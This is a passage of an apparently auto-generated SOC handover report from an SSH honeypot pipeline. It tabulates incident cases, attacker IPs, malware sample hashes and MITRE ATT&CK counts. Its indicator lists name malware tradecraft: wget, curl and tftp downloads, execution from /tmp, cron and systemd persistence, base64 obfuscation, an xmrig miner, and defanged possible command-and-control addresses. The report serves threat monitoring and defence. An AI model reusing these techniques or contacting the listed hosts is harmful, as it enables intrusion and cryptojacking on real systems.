- [ ] Escalate to Tier 2 if pattern repeats next shift

### Additional priority cases (31) — compact view

| Case | Severity | Source IP | First Seen | Auth | Cmds | DL | TTPs |
|---|---|---|---|---|---|---|---|
| IR-e9688b587b6f | HIGH | `141.11.0[.]18` | 2026-11-08 00:51 | Y | 0 | 0 | `T1078 · T1592` |
| IR-d6647e6e9a2a | HIGH | `195.178.110[.]232` | 2026-11-08 00:51 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-1555dbf31056 | HIGH | `103.98.176[.]164` | 2026-11-08 00:52 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-95ed7ce6f609 | HIGH | `103.98.176[.]164` | 2026-11-08 00:52 | Y | 0 | 0 | `T1078 · T1592` |
| IR-5a14ca8770bf | HIGH | `72.17.34[.]38` | 2026-11-08 00:55 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-e7ed91610a6e | HIGH | `72.17.34[.]38` | 2026-11-08 00:55 | Y | 0 | 0 | `T1078 · T1592` |
| IR-044531ae5e42 | HIGH | `195.178.110[.]232` | 2026-11-08 00:55 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-9ceeeee718ed | HIGH | `195.178.110[.]232` | 2026-11-08 00:56 | Y | 42 | 0 | `T1059.004 · T1078 · T1105` |
| IR-c8eb028de9f6 | HIGH | `80.94.92[.]234` | 2026-11-08 01:14 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-454377d8b78c | HIGH | `80.94.92[.]234` | 2026-11-08 01:18 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-ea46fa27cc0e | HIGH | `109.160.32[.]141` | 2026-11-08 01:19 | Y | 1 | 0 | `T1078 · T1592` |
| IR-c739d72ec5fe | HIGH | `80.94.92[.]234` | 2026-11-08 01:22 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-b9cc88136482 | HIGH | `80.94.92[.]234` | 2026-11-08 01:29 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-2366d2d657b5 | HIGH | `109.160.32[.]106` | 2026-11-08 01:32 | Y | 1 | 0 | `T1078 · T1592` |
| IR-58c4f1eca0f9 | HIGH | `80.94.92[.]234` | 2026-11-08 01:32 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-deb26b47a960 | HIGH | `176.65.132[.]216` | 2026-11-08 01:33 | Y | 0 | 0 | `T1078` |
| IR-ab24e0ddd6e8 | HIGH | `80.94.92[.]234` | 2026-11-08 01:35 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-cf529dacfca9 | HIGH | `80.94.92[.]234` | 2026-11-08 01:39 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-7908b4a3edd8 | HIGH | `80.94.92[.]234` | 2026-11-08 01:42 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-2303995e27c6 | HIGH | `80.94.92[.]234` | 2026-11-08 01:45 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-a9775eac528a | HIGH | `80.94.92[.]234` | 2026-11-08 01:49 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-e5efef4d8dde | HIGH | `193.32.162[.]15` | 2026-11-08 01:55 | Y | 0 | 0 | `T1078 · T1592` |
| IR-39429997b45c | HIGH | `109.160.32[.]106` | 2026-11-08 02:00 | Y | 1 | 0 | `T1078 · T1592` |
| IR-bf7b8fc89530 | HIGH | `109.160.32[.]141` | 2026-11-08 02:00 | Y | 1 | 0 | `T1078 · T1592` |
| IR-47d4e4391771 | HIGH | `92.118.39[.]14` | 2026-11-08 02:43 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-44495361d2e5 | HIGH | `92.118.39[.]14` | 2026-11-08 02:46 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-6e471f12848c | HIGH | `176.53.159[.]196` | 2026-11-08 02:49 | Y | 0 | 0 | `T1078 · T1592` |
| IR-613478f55061 | HIGH | `92.118.39[.]14` | 2026-11-08 02:49 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-519cc4e1a3b1 | HIGH | `92.118.39[.]14` | 2026-11-08 02:52 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-bc705730ca32 | HIGH | `109.160.32[.]141` | 2026-11-08 02:55 | Y | 0 | 0 | `T1078 · T1592` |
| IR-61c865d40f07 | HIGH | `109.160.32[.]106` | 2026-11-08 02:55 | Y | 0 | 0 | `T1078 · T1592` |

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `109.160.32[.]106` | **2** | 2026-11-08 01:31 | 2026-11-08 02:27 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `109.160.32[.]141` | **2** | 2026-11-08 01:17 | 2026-11-08 02:37 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `103.76.241[.]73` | 1 | 2026-11-08 00:45 | 2026-11-08 00:45 | 0s | 0 | `T1592` | 🟢 LOW |
| `190.104.37[.]146` | 1 | 2026-11-08 02:54 | 2026-11-08 02:54 | 0s | 0 | `T1592` | 🟢 LOW |
| `193.32.162[.]15` | 1 | 2026-11-08 01:55 | 2026-11-08 01:55 | 0s | 0 | `T1592` | 🟢 LOW |
| `195.178.110[.]232` | 1 | 2026-11-08 00:01 | 2026-11-08 00:01 | 310s | 0 | `T1105` | 🟢 LOW |
| `199.165.159[.]25` | 1 | 2026-11-08 01:33 | 2026-11-08 01:33 | 0s | 0 | `T1592` | 🟢 LOW |
| `20.127.194[.]89` | 1 | 2026-11-08 00:03 | 2026-11-08 00:03 | 0s | 0 | `T1592` | 🟢 LOW |
| `20.14.75[.]245` | 1 | 2026-11-08 02:26 | 2026-11-08 02:26 | 9s | 0 | `T1592` | 🟢 LOW |
| `217.196.164[.]219` | 1 | 2026-11-08 02:49 | 2026-11-08 02:49 | 0s | 0 | `T1592` | 🟢 LOW |
| `3.130.168[.]2` | 1 | 2026-11-08 02:01 | 2026-11-08 02:01 | 0s | 0 | `T1592` | 🟢 LOW |
| `36.232.84[.]81` | 1 | 2026-11-08 00:14 | 2026-11-08 00:16 | 120s | 0 | `T1592` | 🟢 LOW |
| `45.79.207[.]181` | 1 | 2026-11-08 01:39 | 2026-11-08 01:39 | 0s | 0 | `T1592` | 🟢 LOW |
| `54.227.212[.]105` | 1 | 2026-11-08 01:20 | 2026-11-08 01:20 | 2s | 0 | `T1592` | 🟢 LOW |
| `66.132.186[.]202` | 1 | 2026-11-08 00:19 | 2026-11-08 00:20 | 14s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]208` | 1 | 2026-11-08 01:47 | 2026-11-08 01:47 | 15s | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]130` | 1 | 2026-11-08 00:30 | 2026-11-08 00:30 | 0s | 0 | `T1592` | 🟢 LOW |
| `80.94.92[.]234` | 1 | 2026-11-08 01:25 | 2026-11-08 01:25 | 13s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `85.217.149[.]71` | 1 | 2026-11-08 01:38 | 2026-11-08 01:38 | 0s | 0 | `T1592` | 🟢 LOW |
| `92.118.39[.]14` | 1 | 2026-11-08 02:54 | 2026-11-08 02:54 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `0056cc09cf81211b753d79839e3399935a2aa6dd0217232a294f3953b9a7fc26` | ELF Binary (Linux executable) (AArch64 64-bit) | `0056cc09cf81211b...` | 30/100 | 🟢 LOW | **2/75** 🔴 |
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `00deea7003eef2f30f2c84d1497a42c1f375d802ddd17bde455d5fde2a63631f` | ELF Binary (Linux executable) (x86-64 64-bit) | `00deea7003eef2f3...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `026cc4f630776e0c9d42905bf3e9b048fda4da68d58c66e4a2e5bb3d8a9d787c` | ELF Binary (Linux executable) (x86-64 64-bit) | `026cc4f630776e0c...` | 31/100 | 🟢 LOW | **4/75** 🔴 |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `04fcb4584d4de9deb015261bed95adfe0ac7e399503cff848908c1675e196148` | Bash Script | `04fcb4584d4de9de...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0583d9e18684b6297a1219d34dd99c1045658f58c3e9a74ca060d8499a5a0439` | Shell Script | `0583d9e18684b629...` | 70/100 | 🔴 HIGH | **2/75** 🔴 |
| `05af569c3595b01e0724bc96c989105467952fd22a8681a716cfa22ec070d78c` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `05af569c3595b01e...` | 84/100 | 🔴 HIGH | **37/75** 🔴 |
| `062ba629c7b2b914b289c8da0573c179fe86f2cb1f70a31f9a1400d563c3042a` | ELF Binary (Linux executable) (x86-64 64-bit) | `062ba629c7b2b914...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `06901d0a279cc5a062c5de6903102edbcface166424935b01d984580c3d7a928` | Bash Script | `06901d0a279cc5a0...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `072cdf382cce83bc1a59d196a09b6dd1beca38a7a697f30f826633c836952442` | Bash Script | `072cdf382cce83bc...` | 57/100 | 🟡 MEDIUM | **19/75** 🔴 |
| `07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` | ELF Binary (Linux executable) (ARM 32-bit) | `07c0a0af63dde8dc...` | 86/100 | 🔴 HIGH | **40/75** 🔴 |
| `0886e17b38d09ef7b0855a2394dd33454939edb3f33a43096c93e0dccfe6a81c` | ELF Binary (Linux executable) (x86-64 64-bit) | `0886e17b38d09ef7...` | 34/100 | 🟢 LOW | **10/75** 🔴 |
| `094d2147548839ba5ed36d884983aaf14bd7ae650095dec96a1cf537d3b23b48` | ELF Binary (Linux executable) (x86-64 64-bit) | `094d2147548839ba...` | 45/100 | 🟡 MEDIUM | **39/74** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0c082e5b76630d08145c7badd020060e0ce50e333a9f28d39fe15ad6afc49d77` | Bash Script | `0c082e5b76630d08...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0c99433c7d433d65ab890dcee20b330f262379d532bc76f91e18f09ecfa5fb54` | Shell Script | `0c99433c7d433d65...` | 30/100 | 🟢 LOW | 0/75 ✅ |
| `0cd01e621dce7d42e6d6db50ef3e16170e3b737586863ec600826c7b0d3ed423` | Unknown binary | `0cd01e621dce7d42...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0de787cffbec4dcc42e0ecd9491795c7dfe8fe4a955cb67a87544d5c36070982` | ELF Binary (Linux executable) (x86-64 64-bit) | `0de787cffbec4dcc...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `0fad00ddec16b67f3131aa4efffbe32d78fca178407895920b7549667d7bbfbf` | Bash Script | `0fad00ddec16b67f...` | 70/100 | 🔴 HIGH | **25/75** 🔴 |
| `107a9bfb3d0bb71a33ae17a9eac844a7a7562270a09b5ccce608a78316df0222` | ELF Binary (Linux executable) (x86 32-bit) | `107a9bfb3d0bb71a...` | 35/100 | 🟢 LOW | **13/75** 🔴 |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `13960b7e69159907f67f84ce6398d29f73686602ef2c36d837237288f4fe8785` | Bash Script | `13960b7e69159907...` | 58/100 | 🟡 MEDIUM | **20/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16254f69dc7011bdd51beb489af5e9825959e4098e565332da99f8cb58b7a76e` | ELF Binary (Linux executable) (x86 32-bit) | `16254f69dc7011bd...` | 30/100 | 🟢 LOW | **1/75** 🔴 |
| `163cb287fd8f81c13901eb4ddaea2db326213f4d2095e0e64321b9afd8300480` | ELF Binary (Linux executable) (x86 32-bit) | `163cb287fd8f81c1...` | 36/100 | 🟢 LOW | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 83/100 | 🔴 HIGH | **31/70** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `1913ed2ad175632b1b75e99bf5e291f551302b16dea51df318379e77a36f1ce9` | ELF Binary (Linux executable) (MIPS 32-bit) | `1913ed2ad175632b...` | 86/100 | 🔴 HIGH | **42/75** 🔴 |
| `1946ee7ec655de32199ce87390699db1e18d80438bdf01f3b813a929e5cce4e6` | ELF Binary (Linux executable) (MIPS 32-bit) | `1946ee7ec655de32...` | 58/100 | 🟡 MEDIUM | **45/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 70/100 | 🔴 HIGH | **27/75** 🔴 |
| `19e78c00d07f011fcb708ffb12f8dd2fd0f1e57faaf21129b53c7f68ae611e60` | ELF Binary (Linux executable) (x86-64 64-bit) | `19e78c00d07f011f...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `1bc1c784057dc4e36fcc913fe03b1f0cae8474063b486ae3443b9ef8bced9548` | Bash Script | `1bc1c784057dc4e3...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `1bd3745a4f9043ead807d7777669b0dbf5b56985e5b3dd9d7cff8384154ea4a8` | ELF Binary (Linux executable) (x86-64 64-bit) | `1bd3745a4f9043ea...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `1c847d3bd3ef4bf7e21a7091f1479e0e2ca432585ebea996653845b9adfb150e` | ELF Binary (Linux executable) (x86-64 64-bit) | `1c847d3bd3ef4bf7...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` | Shell Script | `1d64be0ba1bd9924...` | 72/100 | 🔴 HIGH | **7/75** 🔴 |
| `1e5e56d2ffc990b1dd966e12a02d89d7dcad92c2f23c34834fbfa8c792d56520` | Unknown binary | `1e5e56d2ffc990b1...` | 22/100 | 🟢 LOW | **30/75** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ec20680994f17b88492809aa5d135fb463c04ec5868639c5515126e2149a240` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ec20680994f17b8...` | 34/100 | 🟢 LOW | **10/75** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`0583d9e18684b6297a1219d34dd99c1045658f58c3e9a74ca060d8499a5a0439` (0583d9e18684b6297a1219d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Hardware recon` — `cat /proc/cpuinfo`

_`05af569c3595b01e0724bc96c989105467952fd22a8681a716cfa22ec070d78c` (05af569c3595b01e0724bc96...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/.kworker`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.161[.]96:55487`

_`07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` (07c0a0af63dde8dc2e36dc58...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/bot`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.160[.]222:55487`

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`0fad00ddec16b67f3131aa4efffbe32d78fca178407895920b7549667d7bbfbf` (0fad00ddec16b67f3131aa4e...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `chmod +x (make executable)` — `chmod +x`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`1913ed2ad175632b1b75e99bf5e291f551302b16dea51df318379e77a36f1ce9` (1913ed2ad175632b1b75e99b...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`
- `Crypto miner binary` — `xmrig`

_`197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` (197c74408e15bd1168105f56...)_
- `Execution from /tmp` — `/tmp/clean_file`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

_`1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` (1d64be0ba1bd9924c3e29ae4...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Hardware recon` — `cat /proc/cpuinfo`
- `IP:Port (possible C2)` — `198.144.179[.]82:80`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `193.32.162[.]15` | RO | UNMANAGED LTD | **100** ⚠️ | 50 |
| `80.94.92[.]234` | RO | TECHOFF SRV LIMITED | **100** ⚠️ | 0 |
| `20.14.75[.]245` | US | Microsoft Corporation | **100** ⚠️ | 4 |
| `20.127.194[.]89` | US | Microsoft Corporation | **100** ⚠️ | 10 |
| `199.165.159[.]25` | US | The Shadowserver Foundation, Inc. | **100** ⚠️ | 20 |
| `36.232.84[.]81` | TW | Chunghwa Telecom Data Communication Business Group | **100** ⚠️ | 0 |
| `66.132.186[.]202` | US | Censys, Inc. | **100** ⚠️ | 50 |
| `109.160.32[.]141` | NL | Global Communication Net Plc | **100** ⚠️ | 30 |
| `77.239.124[.]130` | NL | ROCKET & MARINICA LTD | **100** ⚠️ | 50 |
| `103.98.176[.]164` | ID | Universitas PGRI Semarang | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 67 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 56 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 36 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 30 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 23 |

---

## 🔕 False Positive Summary (13 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 3 |
| AbuseIPDB score 11 below threshold 25 | 1 |
| AbuseIPDB score 12 below threshold 25 | 1 |
| AbuseIPDB score 16 below threshold 25 | 1 |
| AbuseIPDB score 21 below threshold 25 | 1 |
| AbuseIPDB score 5 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 5 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 91 cases |
| Tool 34  | Credential Extractor        | ✅ 2145 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 11 fingerprints |
| Tool 36  | Command Clustering          | ✅ 38 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 40 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 13 filtered (14.3%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 23 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 38 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 56 priority case(s) shown individually · 20 recon entry/entries in table (2 group(s) consolidating 4 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json (pipeline.yml tools) + data/tool_manifest_enriched.json (enriched_corpus.yml tools) — both auto-generated each run, together tracking all active tools across both workflows, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-11-08T03:11:51Z_
